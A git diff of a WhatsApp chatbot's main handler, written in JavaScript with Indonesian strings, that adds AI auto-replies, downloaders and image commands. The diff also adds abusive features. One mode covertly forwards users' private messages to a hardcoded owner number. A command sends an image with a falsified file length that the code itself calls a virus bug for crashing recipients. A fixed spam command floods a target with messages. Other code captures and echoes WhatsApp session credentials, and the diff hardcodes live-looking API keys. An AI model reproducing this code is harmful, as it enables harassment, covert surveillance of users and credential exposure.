@@ -15,6 +15,7 @@ const path = require('path')
 const axios = require('axios')
 const chalk = require('chalk')
 const crypto = require('crypto')
+const { Configuration, OpenAIApi } = require("openai")
 const bocils = require('@bochilteam/scraper')
 const dani = require('./lib/null.js')
 const { cerpen } = require('./storage/story/cerpen')
@@ -30,12 +31,12 @@ const { Primbon } = require('scrape-primbon')
 const primbon = new Primbon()
 const maker = require('mumaker')
 const textpro = require('./lib/textpro')
-const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
+const { generateProfilePicture, smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
 const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
 const barat = moment.tz('Asia/Jakarta').format('HH:mm:ss')
 const tengah = moment.tz('Asia/Makassar').format('HH:mm:ss')
 const timur = moment.tz('Asia/Jayapura').format('HH:mm:ss')
-const nyoutube = ('©© OchoBot')  //ubah di config biar ngk emro
+const botname = ('© OchoBot')  //ubah di config biar ngk emro
 const SatganzDevsyt = ('*ɴᴏᴛᴇ  :*\n*• ʙᴏᴛ ᴍᴀsɪʜ ᴅᴀʟᴀᴍ ᴛᴀʜᴀᴘ ᴘᴇʀᴋᴇᴍʙᴀɴɢᴀɴ ᴊɪᴋᴀ ᴀᴅᴀ ʙᴜɢ sɪʟᴀʜᴋɴ ʟᴀᴘᴏʀ ᴋᴇ ᴏᴡɴᴇʀ.*')  //ubah di config biar ngk emror
 const ini_mark = `0@s.whatsapp.net`
 
@@ -86,6 +87,7 @@ module.exports = SatganzDevs = async (SatganzDevs, m, chatUpdate, store) => {
         const pushname = m.pushName || "No Name"
         const botNumber = await SatganzDevs.decodeJid(SatganzDevs.user.id)
         const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+        const isOwner = m.sender == "6281316701742@s.whatsapp.net" ? true : false
         const itsMe = m.sender == botNumber ? true : false
         const text = q = args.join(" ")
         const quoted = m.quoted ? m.quoted : m
@@ -126,17 +128,38 @@ if (cek == null) return null
 				return await SatganzDevs.relayMessage(chatId, generate.message, { messageId: generate.key.id })
 				}
 	
+				let isNumber = x => typeof x === 'number' && !isNaN(x)
 				
-
             let chats = global.db.data.chats[m.chat]
             if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
             if (chats) {
                 if (!('mute' in chats)) chats.mute = false
                 if (!('antilink' in chats)) chats.antilink = false
+                if (!('simi' in chats)) chats.simi = false
             } else global.db.data.chats[m.chat] = {
                 mute: false,
                 antilink: false,
+                simi: false,
             }
+            
+            let setting = global.db.data.settings[botNumber]
+            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
+	    if (setting) {
+		if (!isNumber(setting.status)) setting.status = 0
+		if (!('autobio' in setting)) setting.autobio = false
+		if (!('activity' in setting)) setting.activity = false	
+		if (!('autoread' in setting)) setting.autoread = false	
+		if (!('autotyping' in setting)) setting.autotyping = false	
+		if (!('autoai' in setting)) setting.autoai = false	 
+	    } else global.db.data.settings[botNumber] = {
+		status: 0,
+		autobio: false,
+		activity: false,
+		autoread: false,
+		autotyping: false,
+		autoai: false,
+	    }
+
         //function leveling & pick
 function pickRandom(list) {
 return list[Math.floor(Math.random() * list.length)]
@@ -144,7 +167,7 @@ return list[Math.floor(Math.random() * list.length)]
         
         // Public & Self
         if (!SatganzDevs.public) {
-            if (!m.key.fromMe) return
+            if (!isCreator) return
         }
 
 	//auto reply 
@@ -154,7 +177,7 @@ return list[Math.floor(Math.random() * list.length)]
 					SatganzDevs.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
 					}
 			}
-
+/* let reactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: m.key, text: "" }) */
 //Storage Rpg
 const { addInventoriDarah, cekDuluJoinAdaApaKagaDiJson, addDarah, kurangDarah, getDarah }  = require('./storage/user/darah')
 const { cekInventoryAdaAtauGak, addInventori, addBesi, addEmas, addEmerald, addUmpan, addPotion, kurangBesi, kurangEmas, kurangEmerald, kurangUmpan, kurangPotion, getBesi, getEmas, getEmerald, getUmpan, getPotion } = require('./storage/user/alat_tukar')
@@ -218,8 +241,8 @@ SatganzDevs.sendMessageV2 = async(chatId, message, options = {}) => {
 				mentions: parseMention(teks), 
 				externalAdReply: {
 				showAdAttribution: true, 
-				title: `${ucapanWaktu} - ${pushname}`, 
-				body: "JOIN GROUP SINI", 
+				title: `${ucapanWaktu}`, 
+				body: pushname, 
 				thumbnail: thumb,
 				mediaType: 2,
  			   mediaUrl: 'https://bit.ly/3uumZI6',
@@ -238,7 +261,7 @@ participant : '0@s.whatsapp.net'
     forwardingScore: 9999,
     isForwarded: false, //:'v
 showAdAttribution: true,
-title: nyoutube,
+title: global.botname,
 mediaType: "VIDEO",
 mediaUrl: `https://githb.com/Ajmal-Achu/Wizard-MD`,
 previewType: "PHOTO",
@@ -298,10 +321,7 @@ sendMenuDoc = async (ID, doc, fileName, fileLength, caption, footer, time, butto
         SatganzDevs.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
         }
         }
-        if (m.chat.endsWith('@s.whatsapp.net') && budy.match("hai")) {   
-SatganzDevs.sendMessage(m.chat, { react: { text: "🌹", key: m.key }})     
-	reply("hai juga kakak");
-}
+        
       // Mute Chat
       if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
       return
@@ -565,10 +585,104 @@ Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
 Selama ${clockString(new Date - afkTime)}
 `.trim())
         }
+        
+        
+        
+        
+        
+        
+        
+        
   
-  SatganzDevs.readMessages([m.key])
-		SatganzDevs.sendPresenceUpdate('available', m.chat)
+   
+        
+        
+        
+        
+        
+        
+        // AUTO TYPING AND AUTO READ
+    	SatganzDevs.readMessages([m.key])
+    	SatganzDevs.sendPresenceUpdate('available', m.chat)
 		SatganzDevs.sendPresenceUpdate('composing', m.chat)
+		// LOGS ACTIVITY 
+		if (isCmd && m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); }
+		if (isCmd && !m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); }
+		//AUTO AI
+		if (global.db.data.settings[botNumber].autoai) {
+        if (isCmd && !m.isGroup) {
+            try {
+            const configuration = new Configuration({
+              apiKey: "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", 
+            });
+            const openai = new OpenAIApi(configuration);
+            console.log("AI RESPON!!!!")
+            const response = await openai.createCompletion({
+              model: "text-davinci-003",
+              prompt: budy,
+              temperature: 0.3,
+              max_tokens: 3000,
+              top_p: 1.0,
+              frequency_penalty: 0.0,
+              presence_penalty: 0.0,
+            });
+            reply(`${response.data.choices[0].text}\n\n`)
+            } catch(err) {
+                console.log(err)
+                m.reply('Maaf, sepertinya ada yang error')
+            }
+        }
+     }
+		// AUTO SIMSIMI 
+		if (db.data.chats[m.chat].simi && isCmd && !m.isGroup) {
+    	SatganzDevs.sendMessage(m.chat, { react: { text: "🤖", key: m.key }})     
+	    const simsimi = require('simsimi')({
+  	  key: 'A0RBRhm~MVJF6QRQS0qFotMaAn2Tl_oByddtC02e',
+		});
+ 	   let jawab = await simsimi(budy.toLowerCase())
+ 	   SatganzDevs.sendButtonText(m.chat, [{ buttonId: 'simi off', buttonText: { displayText: 'Matikan Chat Bot!' }, type: 1 }], jawab, botname, m)
+		}
+		
+		// ACTIVITY INFO
+		if (!m.isGroup && !isOwner && isCmd && global.db.data.settings[botNumber].activity) {
+		let info = m.copyNForward('6281316701742@s.whatsapp.net', true, m.quoted && m.quoted.fromMe ? {
+        contextInfo: {
+        ...m.msg.contextInfo,
+        forwardingScore: 10000000,
+        isForwarded: true,
+        participant: [m.sender]
+        }
+        } : {})
+        await sleep (300)
+        let anudia =`Pesan Dari @${m.sender.split("@")[0]} Jam : ${moment().tz('Asia/Jakarta').format('HH:mm:ss')}`
+        SatganzDevs.sendMessage('6281316701742@s.whatsapp.net', { text: anudia, mentions: parseMention(anudia)}, { quoted:m})
+        }
+        
+		
+		
+		
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		
         switch(command) {
 	    case 'afk': {
                 let user = global.db.data.users[m.sender]
@@ -974,7 +1088,22 @@ Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
                 if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                 if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                 let media = await SatganzDevs.downloadAndSaveMediaMessage(quoted)
-                await SatganzDevs.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
+                let { img, preview } = await generateProfilePicture(media) 
+         await SatganzDevs.query({
+             tag: 'iq',
+             attrs: {
+                to: botNumber,
+                type: 'set',
+                xmlns: 'w:profile:picture'
+             },
+             content: [{
+                 tag: 'picture',
+                 attrs: {
+                    type: 'image'
+                 },
+                    content: img
+             }]
+         }).catch((err) => fs.unlinkSync(media))
                 reply(mess.success)
                 }
                 break
@@ -1176,6 +1305,12 @@ ${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 `
 SatganzDevs.sendTextWithMentions(m.chat, teks_vote, m)
 break
+
+case 'p': {
+let reactionMessage = require("@adiwajshing/baileys").proto.Message.ReactionMessage.create({ key: m.key, text: "" })
+SatganzDevs.relayMessage(m.chat, { reactionMessage }, { messageId: "AMPUN TUAN SATGANZDEVS 🥺🙏" })
+}
+break
 		case 'deletevote': case'delvote': case 'hapusvote': {
             if (!m.isGroup) throw mess.group
             if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
@@ -1259,6 +1394,44 @@ await SatganzDevs.sendButtonText(m.chat, buttons, `Mode Antilink`, SatganzDevs.u
   }
 }
 break
+case 'simi': {
+if (m.isGroup) throw `simi hanya bisa di private chat kak`
+if (args[0] === "on") {
+if (db.data.chats[m.chat].simi) return reply(`Sudah Aktif Sebelumnya`)
+db.data.chats[m.chat].simi= true
+reply(`Simi Aktif !\nSekarang Semua pesan yang kamu kirim akan di balas oleh bot`)
+} else if (args[0] === "off") {
+if (!db.data.chats[m.chat].simi) return reply(`Sudah Tidak Aktif Sebelumnya`)
+db.data.chats[m.chat].simi = false
+reply(`Simi di matikan.`)
+} else {
+let buttons = [
+{ buttonId: 'simi on', buttonText: { displayText: 'On' }, type: 1 },
+{ buttonId: 'simi off', buttonText: { displayText: 'Off' }, type: 1 }
+]
+await SatganzDevs.sendButtonText(m.chat, buttons, `Mode Auto Chat\nJika Mengaktifkan Mode ini, bot akan membalas semua pesan yang anda kirim\nTekan Tombol On/off untuk meng hidup/matikan autochat.`, SatganzDevs.user.name, m)
+  }
+}
+break
+case 'activity': {
+if (!isCreator) throw mess.owner
+if (args[0] === "on") {
+if (global.db.data.settings[botNumber].activity) return reply(`Sudah Aktif Sebelumnya`)
+global.db.data.settings[botNumber].activity = true
+reply(`berhasil menyalakan info aktifitas pengguna`)
+} else if (args[0] === "off") {
+if (!global.db.data.settings[botNumber].activity) return reply(`Sudah Tidak Aktif Sebelumnya`)
+global.db.data.settings[botNumber].activity = false
+reply(`Infochat di matikan.`)
+} else {
+let buttons = [
+{ buttonId: 'activity on', buttonText: { displayText: 'On' }, type: 1 },
+{ buttonId: 'activity off', buttonText: { displayText: 'Off' }, type: 1 }
+]
+await SatganzDevs.sendButtonText(m.chat, buttons, `Mode Auto Chat Owner \nJika Ada Yang Mengechat Bot\nTekan Tombol On/off untuk meng hidup/matikan autochat.`, SatganzDevs.user.name, m)
+  }
+}
+break
 case 'antilinkyoutube': {
 if (!m.isGroup) throw mess.group
 if (!isBotAdmins) throw mess.botAdmin
@@ -1279,6 +1452,10 @@ let buttons = [
 await SatganzDevs.sendButtonText(m.chat, buttons, `Mode Antilink Youtube`, SatganzDevs.user.name, m)
   }
 }
+break
+case 'say':
+if (!q) return reply('MAU BILANG APA GWNYA?')
+reply(q)
 break
 case 'antilinktiktok': {
 if (!m.isGroup) throw mess.group
@@ -1395,9 +1572,9 @@ break
                let pjtxt = `Pesan Dari : @${me.split('@')[0]} \nUntuk : @${ownernya.split('@')[0]}\n\n${text}`
                let ments = [ownernya, me]
                let buttons = [{ buttonId: 'hehe', buttonText: { displayText: 'Makasih Laporannya :/' }, type: 1 }]
-            await SatganzDevs.sendButtonText('6281545463585@s.whatsapp.net', buttons, pjtxt, nyoutube, m, {mentions: ments})
+            await SatganzDevs.sendButtonText('6281545463585@s.whatsapp.net', buttons, pjtxt, global.botname, m, {mentions: ments})
             let akhji = `Laporan Anda Telah Terkirim Ke Owner @${ownernya.split('@')[0]}\n*Terima Kasih Atas Laporannya🙏*\n_(Nomermu Akan Terblokir Jika Laporan Hanya Di Buat Buat)_`
-            await SatganzDevs.sendButtonText(m.chat, buttons, akhji, nyoutube, m, {mentions: ments})
+            await SatganzDevs.sendButtonText(m.chat, buttons, akhji, global.botname, m, {mentions: ments})
             }
             break
             break
@@ -1528,6 +1705,65 @@ if (!isCreator) return replay(mess.owner)
                 }
             }
             break
+			case 'jadivirgam': case 'tovirgam':
+			if (!isCreator) return reply(mess.owner)
+			if (!quoted) throw `*Balas Video/Image Dengan Caption* ${prefix + command}`
+            reply(mess.wait)
+			if (/image/.test(mime)) {
+                let media = await quoted.download()
+                let encmedia = await SatganzDevs.sendMessage(m.chat, {image: media, fileLength: 900000000, caption: `Here's the photo\n\n⚠️*Pay attention.!!*⚠️\This photo contains image virus/sw bug`,}, {quoted: m, jpegThumbnail: fs.readFileSync('./src/SatganzDevs.png')})
+                await fs.unlinkSync(encmedia)
+                } else {
+                throw `*Kirim Gambar Dengan Caption* ${prefix + command}`
+                }
+                break
+			case 'jadibot':
+if(m.isGroup) return reply('Only With Private Chat/PC')
+client.version = [2, 2228, 8]
+client.browserDescription = ['SatganzDevs','Safari','1.0.0']
+if (args[0] && args[0].length > 200) {
+	let json = getBuffer(args[0], 'base64').toString('utf-8')
+    let obj = JSON.parse(json)
+    await client.loadAuthInfo(obj)
+}
+try {
+client.on('qr' ,async qr => {
+qrbot = await qrkode.toDataURL(qr, { scale: 8 })
+buffqr = await getBuffer(qrbot.split('data:image/png;base64,')[1], 'base64')
+await fs.writeFileSync(`./@${m.sender}.jpg`, buffqr)
+let scen = await SatganzDevs.sendMessage(m.chat, { image : fs.readFileSync(`./src/@${m.sender}.jpg`), caption: 'Scan QR ini untuk jadi bot sementara!\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk WhatsApp Web\n3. Scan QR ini \n\nQR Expired dalam 20 detik'}, {quoted: m})    
+setTimeout(() => {
+       SatganzDevs.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: scen, participant: m.sender } })
+  }, 30000);
+})  
+client.on ('open', async () => {
+  console.log ('credentials update')
+  const authInfo = client.base64EncodedAuthInfo()
+  fs.writeFileSync(`./${sender}.json`, JSON.stringify(authInfo  ,null, '\t'))
+  await client.sendMessage('0@s.whatsapp.net', `Kamu bisa login tanpa qr dengan pesan dibawah ini`, MessageType.extendedText)
+  client.sendMessage('0@s.whatsapp.net', `${prefix}${command} ${getBuffer(JSON.stringify(authInfo)).toString('base64')}`, MessageType.extendedText)
+})
+client.on('chat-update', async (chat) => {
+	require('./SatganzDevs.js')(client, chat)
+})    
+await client.connect().then(async ({user}) => {
+reply('Berhasil tersambung dengan WhatsApp - mu.\n*NOTE: Ini cuma numpang*\n' + JSON.stringify(user, null, 2))
+})
+} catch {
+reply('Error! hanya 1 orang yang dapat mengakses fitur jadibot')
+}
+break
+case 'stopjadibot':
+if (!isOwner && !mek.key.fromMe) return reply(mess.owner)
+try {
+reply('Oke')
+fs.unlinkSync(`./src/${sender}.json`)
+client.close()
+} catch {
+reply('Oke')
+client.close()
+}
+break
             case 'ebinary': {
             if (!text) throw `Example : ${prefix + command} text`
             let { eBinary } = require('./lib/binary')
@@ -1801,11 +2037,21 @@ break
 case 'ytmp3': case 'ytaudio': {
 if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
 let quality = args[1] ? args[1] : '128kbps'
-let media = await fetchJson(`https://zenzapis.xyz/downloader/youtube?apikey=79fe4911db&url=${q}`)
-if (media.result.sizeAudio >= 100000) return reply('File Melebihi Batas '+util.format(media))
- console.log(media)
-SatganzDevs.sendImage(m.chat, media.result.thumb, `あ Title : ${media.result.title}\nあ File Size : ${media.result.sizeAudio}\nあ Url : ${isUrl(text)}\nあ Ext : MP3\nあ Resolusi : ${args[1] || '128kbps'}`, m)
-SatganzDevs.sendMessage(m.chat, { audio: { url: media.result.getAudio  }, mimetype: 'audio/mpeg', fileName: `${media.result.title}.mp3` }, { quoted: m })
+bocils.youtubedlv2(q).then(res => {
+let media = res.audio
+if (res.fileSize >= 100000) return reply('File Melebihi Batas '+util.format(media))
+ console.log(res)
+SatganzDevs.sendMessage(m.chat, { audio: { url: media  }, mimetype: 'audio/mpeg', fileName: `${res.title}.mp3`, contextInfo: {
+				mentions: [m.sender], 
+				externalAdReply: {
+				showAdAttribution: true, 
+				title: res.title, 
+				body: moment().tz('Asia/Jakarta').format('HH:mm:ss'), 
+				thumbnail: res.thumbnail,
+				mediaType: 2,
+ 			   mediaUrl: 'https://bit.ly/3uumZI6',
+				sourceUrl: "https://bit.ly/3uumZI6"}}}, {quoted: m})
+ })
  }
  break
 case 'ytmp4': case 'ytvideo': {
@@ -1813,14 +2059,21 @@ if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFM
 let quality = args[1] ? args[1] : '360p'
 bocils.youtubedlv2(q).then(res => {
 let buttons = [
-{"buttonId": `${prefix}tiktokaudio${args[0]} `,"buttonText": {"displayText": `audio`},"type": "RESPONSE"}]
-let ep = res
+{"buttonId": `${prefix}ytmp3${args[0]} `,"buttonText": {"displayText": `audio`},"type": "RESPONSE"}]
+let ep = res.video
 if (ep.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
  console.log(ep)
-SatganzDevs.sendMessage(m.chat, { video: { url: ep.video }, mimetype: 'video/mp4', fileName: `${ep.title}.mp4`, caption: `あ Title : ${ep.title}\nあ File Size : ${ep.filesizeH}\nあ Url : ${isUrl(text)}\nあ Ext : MP3\nあ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
+SatganzDevs.sendMessage(m.chat, { video: { url: ep }, mimetype: 'video/mp4', fileName: `${ep.title}.mp4`, caption: `あ Title : ${ep.title}\nあ File Size : ${ep.filesizeH}\nあ Url : ${isUrl(text)}\nあ Ext : MP3\nあ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
  })
  }
  break
+case 'stalkff':
+if (!q) return reply('idnya?')
+bocils.tiktokdlv2(q).then(result => {
+console.log(result)
+	reply(result.username)
+	})
+	break
             case 'pinterest': {
                 reply(mess.wait)
 		let { pinterest } = require('./lib/scraper')
@@ -1902,7 +2155,7 @@ break
                 let buttonMessage = {
                     image: buffer,
                     caption: `Random Waifu`,
-                    footer: nyoutube,
+                    footer: global.botname,
                     buttons: buttons,
                     headerType: 4
                 }
@@ -1924,7 +2177,7 @@ break
                 let buttonMessage = {
                     image: { url: 'https://coffee.alexflipnote.dev/random' },
                     caption: `☕ Random Coffe`,
-                    footer: nyoutube,
+                    footer: global.botname,
                     buttons: buttons,
                     headerType: 4
                 }
@@ -1942,7 +2195,7 @@ break
                 let buttonMessage = {
                     image: { url: result.image[0] },
                     caption: `• Title : ${result.title}\n• Category : ${result.type}\n• Detail : ${result.source}\n• Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
-                    footer: nyoutube,
+                    footer: global.botname,
                     buttons: buttons,
                     headerType: 4
                 }
@@ -1973,7 +2226,7 @@ case 'tts': {
                 result = n[Math.floor(Math.random() * n.length)]
                 let jwbn = `*Nama : ${result.nama}\n*Link : ${result.link}*`
 let buttons = [{ buttonId: `tesrow`, buttonText: {displayText: 'BACK‡'}, type: 1},{buttonId: `donasi`, buttonText: {displayText: 'DONASI‡'}, type: 1}]
-            await SatganzDevs.sendButtonText(m.chat, buttons, jwbn, nyoutube, m)
+            await SatganzDevs.sendButtonText(m.chat, buttons, jwbn, global.botname, m)
             }
             break
             case 'wikimedia': {
@@ -1987,7 +2240,7 @@ let buttons = [{ buttonId: `tesrow`, buttonText: {displayText: 'BACK‡'}, type:
                 let buttonMessage = {
                     image: { url: result.image },
                     caption: `• Title : ${result.title}\n• Source : ${result.source}\n• Media Url : ${result.image}`,
-                    footer: nyoutube,
+                    footer: global.botname,
                     buttons: buttons,
                     headerType: 4
                 }
@@ -2036,6 +2289,58 @@ teks += `あ *${i.name}* : ${i.result}\n\n`
 reply(teks)
 }
 break
+//RANDOM IMAGE
+case 'anime': {
+var anime = JSON.parse(fs.readFileSync('./storage/asupan/anime.json'))
+let resanime = pickRandom(anime)
+let buttons = [
+{buttonId: `${command}`, buttonText: {displayText: '⬡ NEXT'}, type: 1}
+]
+let buttonMessage = {
+image: { url: resanime },
+fileLength: 9999999999999999999,
+caption: "nih om",
+footer: global.botname,
+buttons: buttons,
+headerType: 2
+}
+SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m })
+}
+break
+case 'nsfw': {
+var ns = JSON.parse(fs.readFileSync('./storage/asupan/nsfw.json'))
+let fw = pickRandom(ns)
+let buttons = [
+{buttonId: `${command}`, buttonText: {displayText: '⬡ NEXT'}, type: 1}
+]
+let buttonMessage = {
+image: { url: fw },
+fileLength: 9999999999999999999,
+caption: "nih om",
+footer: global.botname,
+buttons: buttons,
+headerType: 2
+}
+SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m })
+}
+break
+case 'dog': {
+var riapi = require("random-images-api")
+riapi.dog().then(url => {
+let buttons = [
+{buttonId: `${command}`, buttonText: {displayText: '⬡ NEXT'}, type: 1}
+]
+let buttonMessage = {
+image: { url: url },
+caption: "nih",
+footer: global.botname,
+buttons: buttons,
+headerType: 2
+}
+SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m })
+})
+}
+break
 //SELESAAAI//
             case 'quotesanime': case 'quoteanime': {
 		let { quotesAnime } = require('./lib/scraper')
@@ -2046,7 +2351,7 @@ break
                 ]
                 let buttonMessage = {
                     text: `~_${result.quotes}_\n\nBy '${result.karakter}' \n\nAnime : ${result.anime}\n\n- ${result.up_at}`,
-                    footer: nyoutube,
+                    footer: global.botname,
                     buttons: buttons,
                     headerType: 2
                 }
@@ -2054,13 +2359,13 @@ break
             }
             break
 	        case 'motivasi': {
-                let anu = await fetchJson(`https://kocakz.herokuapp.com/api/random/text/quotes`)
+                let anu = await fetchJson(`https://zenzapis.xyz/randomtext/motivasi?apikey=79fe4911db`)
                 let buttons = [
                     {buttonId: `motivasi`, buttonText: {displayText: 'Next'}, type: 1}
                 ]
                 let buttonMessage = {
-                    text: anu.result.quote,
-                    footer: nyoutube,
+                    text: anu.result.message,
+                    footer: global.botname,
                     buttons: buttons,
                     headerType: 2
                 }
@@ -2215,7 +2520,7 @@ break
 			let messages = text.split("|")[1]
 			let amounts = text.split("|")[2]
 			if (!messages) return reply('Pesannya?')
-			if (!amount) return reply('jumlahnya?')
+			if (!amounts) return reply('jumlahnya?')
 			for (let i = 0; i < amounts; i++){
 		    SatganzDevs.sendMessage(target, { text: messages })}
 		    reply(`Sukses Spam Target Sebanyak ${amounts}`)
@@ -4061,7 +4366,7 @@ Lihat list Pesan Dengan ${prefix}listmsg`)
 case 'proses': {
 min = `• ᴋɪʀɪᴍ ɪᴅ ᴀᴋᴜɴ ᴋᴀʟɪᴀɴ ᴅᴇɴɢᴀɴ ᴄᴀʀᴀ ᴋʟɪᴋ ʙᴜᴛᴛᴏɴ sᴇɴᴅ ɪᴅ\n\n•ᴜɴᴛᴜᴋ ᴘᴇᴍʙᴀʏᴀʀᴀɴ sɪʟᴀʜᴋᴀɴ ᴋʟɪᴋ ʙᴜᴛᴛᴏɴ ʙᴀʏᴀʀ\n\nTerima Kasih.`
 let buttons = [{ buttonId: `owner`, buttonText: {displayText: 'sᴇɴᴅ ɪᴅ‡'}, type: 1},{buttonId: `bayar`, buttonText: {displayText: 'ʙᴀʏᴀʀ‡'}, type: 1}]
-            await SatganzDevs.sendButtonText(m.chat, buttons, min, nyoutube, m)
+            await SatganzDevs.sendButtonText(m.chat, buttons, min, global.botname, m)
             }
             break
 case 'ff':{
@@ -4190,14 +4495,14 @@ break
 			this.menfess = this.menfess ? this.menfess : {}
                 let room = Object.values(this.menfess).find(room => room.state === 'WAITING')
                 if (room) {
-                    await SatganzDevs.sendButtonText(room.a, [{ buttonId: 'hehehe', buttonText: { displayText: 'LIKE ♥️' }, type: 1 }], `\`\`\`Menfess Berhasil Tersambung, sekarang kamu dapat mengirim pesan\`\`\``, nyoutube, m)
+                    await SatganzDevs.sendButtonText(room.a, [{ buttonId: 'hehehe', buttonText: { displayText: 'LIKE ♥️' }, type: 1 }], `\`\`\`Menfess Berhasil Tersambung, sekarang kamu dapat mengirim pesan\`\`\``, global.botname, m)
                     room.state = 'CHATTING'
-                    await SatganzDevs.sendButtonText(m.chat, [{ buttonId: 'hehehe', buttonText: { displayText: 'LIKE ♥️' }, type: 1 }], `\`\`\`Menfess Berhasil Tersambung, sekarang kamu dapat mengirim pesan\`\`\``, nyoutube, m)
+                    await SatganzDevs.sendButtonText(m.chat, [{ buttonId: 'hehehe', buttonText: { displayText: 'LIKE ♥️' }, type: 1 }], `\`\`\`Menfess Berhasil Tersambung, sekarang kamu dapat mengirim pesan\`\`\``, global.botname, m)
                 } else if (!room) { 
 				    let buty = [
                         { buttonId: 'dm', buttonText: { displayText: 'Delete Menfess' }, type: 1 }
                     ]
-                    await SatganzDevs.sendButtonText(m.chat, buty, `\`\`\`Masih Ada Sesi Menfess Sebelumnya, Tekan Tombol Di Bawah Untuk Menghentikan Sesi Menfess Sebelumnya\`\`\``,  nyoutube, m)}
+                    await SatganzDevs.sendButtonText(m.chat, buty, `\`\`\`Masih Ada Sesi Menfess Sebelumnya, Tekan Tombol Di Bawah Untuk Menghentikan Sesi Menfess Sebelumnya\`\`\``,  global.botname, m)}
                 }
                 break
             case 'keluar': case 'leave': {
@@ -4458,9 +4763,9 @@ case 'req': case 'request': {
                let pjtxt = `Pesan Dari : @${me.split('@')[0]} \nUntuk : @${ownernya.split('@')[0]}\n\n${command} ${text}`
                let ments = [ownernya, me]
                let buttons = [{ buttonId: 'tesrow', buttonText: { displayText: 'MENU‡' }, type: 1 },{ buttonId: 'DONASI', buttonText: { displayText: 'DONASI' }, type: 1 }]
-            await SatganzDevs.sendButtonText(ownernya, buttons, pjtxt, nyoutube, m, {mentions: ments, quoted: m })
+            await SatganzDevs.sendButtonText(ownernya, buttons, pjtxt, global.botname, m, {mentions: ments, quoted: m })
             let akhji = `*Request Telah Terkirim*\n*Ke Owner @${ownernya.split('@')[0]}*`
-            await SatganzDevs.sendButtonText(m.chat, buttons, akhji, nyoutube, m, {mentions: ments, quoted: m })
+            await SatganzDevs.sendButtonText(m.chat, buttons, akhji, global.botname, m, {mentions: ments, quoted: m })
             }
             break
 case 'reeport': {
@@ -4545,13 +4850,13 @@ case 'store':{
 break
 //ini MENU NYA YA ADICK"//
 case 'menu': {
-const Jimp = require('jimp')
+buffer = fs.readFileSync(`./SatganzDevsMedia/menu.jpg`)
 SatganzDevs.sendMessage(m.chat, { react: { text: "🔥", key: m.key }})
   	anu = `*sᴀʏᴀ ᴏᴄʜᴏʙᴏᴛ, ʙᴏᴛ ᴡʜᴀᴛsᴀᴘᴘ ʏᴀɴɢ ᴍᴇᴍʙᴀɴᴛᴜ ᴀɴᴅᴀ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʀᴍᴜᴅᴀʜ sᴇsᴜᴀᴛᴜ sᴇᴘᴇʀᴛɪ ᴍᴇᴍʙᴜᴀᴛ sᴛɪᴄᴋᴇʀ ᴅᴀɴ ʟᴀɪɴɴʏᴀ.*`
-    let buttons = [{ buttonId: `tesrow`, buttonText: { displayText: `𝘔𝘌𝘕𝘜` }, type: 1 }, { buttonId: `rules`, buttonText: { displayText: `𝘙𝘜𝘓𝘌𝘚` }, type: 1 }]
+    let buttons = [{ buttonId: `tesrow`, buttonText: { displayText: `Menu` }, type: 1 },{ buttonId: `simi`, buttonText: { displayText: `Simi` }, type: 1 }]
     let buttonMessage = {
-   document: fs.readFileSync(`./SatganzDevsMedia/doc/ngentot.xlsx`),
-  fileName : `Hi ${pushname} |${ucapanWaktu}`,
+  image: buffer,
+  fileLength: 9999999999999,
   caption: anu,
   footer: SatganzDevsyt,
   buttons: buttons,
@@ -4560,9 +4865,8 @@ SatganzDevs.sendMessage(m.chat, { react: { text: "🔥", key: m.key }})
   title: '© OchoBot',
   body: 'Follow Me on Instagram', 
   showAdAttribution: true,
